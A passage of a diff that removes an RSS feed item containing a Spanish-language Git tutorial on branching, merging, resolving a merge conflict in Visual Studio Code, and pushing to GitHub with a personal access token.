-&lt;p&gt;Primero voy a dirigirme a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
-Cambiado a rama 'main'
-❯ git branch
-* main
-  primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora crearemos un nuevo &lt;code&gt;branch&lt;/code&gt; y nos metemos en el&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch
-Cambiado a nueva rama 'segundo-branch'
-❯ git branch
-  main
-  primer-branch
-* segundo-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a modificar el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Hola Git
-Ahora estoy aprendiendo Git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Continuamos verificado el estadoy vemos que fue modificado&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
-En la rama segundo-branch
-Cambios no rastreados para el commit:
-  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
-  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
-	modificados:     archivo_git.txt
-
-sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Sigue agregarlo al area de preparación&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
-❯ git status
-En la rama segundo-branch
-Cambios a ser confirmados:
-  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
-	modificados:     archivo_git.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Creamos el &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Agregamos una segunda linea al archivo
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama segundo-branch
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Guardamos y cerramos&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
-[segundo-branch 924f1c5] Agregamos una segunda linea al archivo
- 1 file changed, 2 insertions(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora volveremos a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; y vemos el antiguo contenido.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Este es mi segundo commit pero modificado
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para poder realizar ahora el &lt;code&gt;merge&lt;/code&gt; o la fusión de &lt;code&gt;branch&lt;/code&gt;, despues de ya terminar de hacer todos nuestros cambios. Debemos estar en el &lt;code&gt;branch&lt;/code&gt; que recibira los cambios.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-* main
-  primer-branch
-  segundo-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y ahora procedemos a ejecutar el comando &lt;code&gt;git merge&lt;/code&gt; seguido de el nombre de la rama que queremos fusionar, en nuesto caso queremos fusionar el &lt;code&gt;branch&lt;/code&gt; recien creado &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge segundo-branch
-Actualizando 415796f..924f1c5
-Fast-forward
- archivo_git.txt | 3 ++-
- 1 file changed, 2 insertions(+), 1 deletion(-)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos el mensaje de que se estan combinando todos los &lt;code&gt;commits&lt;/code&gt; con el &lt;code&gt;branch&lt;/code&gt; principal&lt;/p&gt;
-
-&lt;p&gt;Y ahora si leemos el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;, vemos que se combinaron ambos &lt;code&gt;branch&lt;/code&gt; :)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Hola Git
-Ahora estoy aprendiendo Git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y si vemos el historial ahora ese &lt;code&gt;commit&lt;/code&gt; que hicimos al modificar el archivo en &lt;code&gt;segundo-branch&lt;/code&gt;, tambien es parte de &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
-924f1c5 (HEAD -&amp;gt; main, segundo-branch) Agregamos una segunda linea al archivo
-415796f Actualizar teto del segundo commit modificado
-0143452 agregar mi archivo de texto
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar Branchs &lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
-
-&lt;p&gt;Ya que realizamos antes el &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;, no necesitamos ya el &lt;code&gt;branch&lt;/code&gt; que creamos &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-* main
-  primer-branch
-  segundo-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Asi que podemos borrar este &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
-Eliminada la rama segundo-branch (era 924f1c5).
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora los conflictos ocurren cuando tratamos de hacer un &lt;code&gt;merge&lt;/code&gt; de archivos que tienen cambios que tienen conflictos.&lt;/p&gt;
-
-&lt;p&gt;Estos pueden ser: Modificar el mismo texto, Modificar la misma linea o elemento, esto &lt;code&gt;Git&lt;/code&gt; los considera incompatible.&lt;/p&gt;
-
-&lt;p&gt;En estos casos tenemos que decidir como vamos a hacer el &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Veamoslo a continuación:&lt;/p&gt;
-
-&lt;p&gt;Vemos que el contenido del archivo en &lt;code&gt;primer-branch&lt;/code&gt; es&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
-  main
-* primer-branch
-❯ /bin/cat archivo_git.txt
-Hola miGit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;y ahora si vamos a &lt;code&gt;main&lt;/code&gt; y leemos el archivo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
-Cambiado a rama 'main'
-❯ /bin/cat archivo_git.txt
-Hola Git
-Ahora estoy aprendiendo Git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Que pasa si intentamos hacer un &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge primer-branch
-Auto-fusionando archivo_git.txt
-CONFLICTO (contenido): Conflicto de fusión en archivo_git.txt
-Fusión automática falló; arregle los conflictos y luego realice un commit con el resultado.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al ejecutar el comando, nos dice que la combinación automatica falló y debemos arreglar los conflictos.&lt;/p&gt;
-
-&lt;p&gt;Si vamos a nuestro editor de texto nos mostrara algo de este tipo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
-Hola Git
-Ahora estoy aprendiendo Git
-=======
-Hola miGit
-&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; primer-branch
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;En este caso el editor de texto &lt;code&gt;Visual Studio Code&lt;/code&gt;, nos fascilita decidir cuando tenemos este tipo de conflictos. Asi que en estos casos es muy recomendable usarlo.&lt;/p&gt;
-
-&lt;p&gt;Nos da las opciones:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code&gt;Accept Current Change&lt;/code&gt; : Aceptar el cambio actual “del branch main”&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;Accept Incoming Change&lt;/code&gt; : Aceptar el cambio entrante “del branch primer-branch”&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;Accept Both Change&lt;/code&gt; : Aceptar ambos cambios&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;Compare changes&lt;/code&gt; : Comparar los cambios&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Esa decisión ya dependera del cambio que estes dispuesto a aceptar.&lt;/p&gt;
-
-&lt;p&gt;En este caso usare la opción de aceptar ambos cambios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Continuamos guardando y cerrando el editor y ejecutamos &lt;code&gt;git merge --continue&lt;/code&gt; para continuar el proceso de fusión, esto nos abrira el editor nuevamente con el mensaje que se asignara al &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Merge branch 'primer-branch'
-
-# Conflicts:
-#	archivo_git.txt
-#
-# Parece que estás realizando una fusión.
-# Si esto no es correcto, ejecuta
-#	git update-ref -d MERGE_HEAD
-# e intenta de nuevo.
-
-
-# Por favor ingresa el mensaje del commit para tus cambios. Las
-#  líneas que comiencen con '#' serán ignoradas, y un mensaje
-#  vacío aborta el commit.
-#
-# En la rama main
-# Todos los conflictos resueltos pero sigues fusionando.
-#
-# Cambios a ser confirmados:
-#	modificados:     archivo_git.txt
-#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Guardamos el archivo y cerramos para culminar el proceso&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge --continue
-[main 95b5d86] Merge branch 'primer-branch'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pudimos solucionar el conflicto y nos hizo el &lt;code&gt;merge&lt;/code&gt; de manera exitosa, como vimos en este caso &lt;code&gt;visual studio code&lt;/code&gt; es muy útil para solucionar estos conflictos.&lt;/p&gt;
-
-&lt;p&gt;Ahora finalmente leeremos el archivo otra vez&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
-Hola Git
-Ahora estoy aprendiendo Git
-Hola miGit
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y como resultado tenemos el archivo tal y cual lo combinamos.&lt;/p&gt;
-
-&lt;h2 id=&quot;conexión-con-github&quot;&gt;Conexión con Github &lt;a href=&quot;#conexión-con-github&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Despues de haber trabajado todo nuestro codigo, llego la hora de subirlo a la nube. Vamos a hacer esto utilizando &lt;code&gt;GitHub&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Para ello lo primero que debemos hacer es crearnos una cuenta, lo cual es un proceso muy sencillo, podemos hacerlo usando dirigiendonos a este enlace:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&quot;&gt;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Una vez creada nuestra cuenta nos vamos a la sección de &lt;code&gt;Repositorios&lt;/code&gt; y le damos a &lt;code&gt;New&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a elegir un nombre para nuestro repositorio en este caso usaremos de nombre &lt;code&gt;mi-primer-repositorio&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente sera dar click en &lt;code&gt;Create&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora nos dara una serie de opciones de que podemos hacer para subirlo aqui en &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nosotros usaremos el comando, &lt;code&gt;git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git&lt;/code&gt;, en donde &lt;code&gt;git remote&lt;/code&gt; nos va a servir para indicar si es que vamos a tener un servidor remoto en el cual subir nuestros cambios y con &lt;code&gt;add origin&lt;/code&gt; le indicamos de donde nosotros tenemos que ir a obtener nuestro codigo y tambien a donde tenemos que subir los cambios realizados y finalmente la &lt;code&gt;url&lt;/code&gt; de donde se encuentra almacenado nuestro codigo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finalmente usaremos el comando &lt;code&gt;git push&lt;/code&gt;, para subir nuestros cambios los cuales seran con respecto a el &lt;code&gt;branch&lt;/code&gt; con la que estemos trabajando, pero ya que &lt;code&gt;main&lt;/code&gt; no se encuentra creado en &lt;code&gt;github&lt;/code&gt; con &lt;code&gt;-u&lt;/code&gt; creamos el &lt;code&gt;branch&lt;/code&gt; y con &lt;code&gt;origin&lt;/code&gt; indicamos donde queremos que sea creado y finalmente el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de ejecutar el comando nos pedira ingresar el nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Procedemos a ingresar el &lt;code&gt;usuario&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
-Username for 'https://github.com': f1rtsmiracle
-Password for 'https://f1rtsmiracle@github.com':
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Sim embargo en &lt;code&gt;password&lt;/code&gt; no debemos ingresar la contraseña con la que nos registramos a &lt;code&gt;github&lt;/code&gt;. Aqui nosotros debemos introducir una &lt;code&gt;key&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Para obtenerla nos dirigimos a la opción de nuestro perfil &lt;code&gt;settings&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues nos vamos a la opción &lt;code&gt;Developer Settings&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A continuación vamos a la opción &lt;code&gt;Personal Access Token&lt;/code&gt; -&amp;gt; &lt;code&gt;Tokens (classic)&lt;/code&gt; -&amp;gt; &lt;code&gt;Generate New Token&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ingresamos el nombre del token, establecemos un tiempo de expiración y marcamos la opción &lt;code&gt;repo&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Finalmente damos click en la opción &lt;code&gt;Generate Token&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Estos nos mostrara nuestro &lt;code&gt;token&lt;/code&gt; creado el cual debemos copiarlo y ingresarlo en &lt;code&gt;Password&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y vemos como todo nuestro codigo se subio a &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
-Username for 'https://github.com': f1rtsmiracle
-Password for 'https://f1rtsmiracle@github.com': 
-Enumerando objetos: 21, listo.
-Contando objetos: 100% (21/21), listo.
-Compresión delta usando hasta 4 hilos
-Comprimiendo objetos: 100% (8/8), listo.
-Escribiendo objetos: 100% (21/21), 1.73 KiB | 888.00 KiB/s, listo.
-Total 21 (delta 1), reusados 0 (delta 0), pack-reusados 0
-remote: Resolving deltas: 100% (1/1), done.
-To https://github.com/f1rtsmiracle/mi-primer-repositorio.git
- * [new branch]      main -&amp;gt; main
-Rama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origin'.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a nuestro repositorio nuevamente y vemos los cambios.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y cada vez que queramos seguir agregando nuevos cambios, lo vamos modificando con nuestro editor de texto preferido, luego nos vamos a la terminal y los agregamos con &lt;code&gt;git add&lt;/code&gt;. Creamos un &lt;code&gt;commit&lt;/code&gt; y finalmente usamos el comando de &lt;code&gt;git push&lt;/code&gt; y con ese vamos a agregar todos nuestros cambios.&lt;/p&gt;
-
-&lt;p&gt;Ahora en caso que estemos creando un nuevo &lt;code&gt;branch&lt;/code&gt; y todavia no queremos hacerle un &lt;code&gt;merge&lt;/code&gt;, pero si queremos subirlo a &lt;code&gt;github&lt;/code&gt;, lo que tenemos que hacer es cambiar de &lt;code&gt;branch&lt;/code&gt; con el comando &lt;code&gt;git checkout nombre_branch&lt;/code&gt; y ejecutamos &lt;code&gt;git push -u nombre_rama&lt;/code&gt; y lo que hara es crear este &lt;code&gt;branch&lt;/code&gt; en el repositorio.&lt;/p&gt;
-
-&lt;p&gt;Espero haberte ayudado, esto seria todo hasta la proxima!!! :)&lt;/p&gt;
-</description>
-        <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000/articulos/Git</link>
-        <guid isPermaLink="true">http://localhost:4000/articulos/Git</guid>
-        
-        <category>Git</category>
-        
-        <category>Repositorio</category>
-        
-        <category>Experto</category>
-        
-        <category>Gratis</category>
-        
-        <category>Domina</category>
-        
-        <category>Github</category>
-        
-        
-        <category>articulos</category>
         
       </item>
     
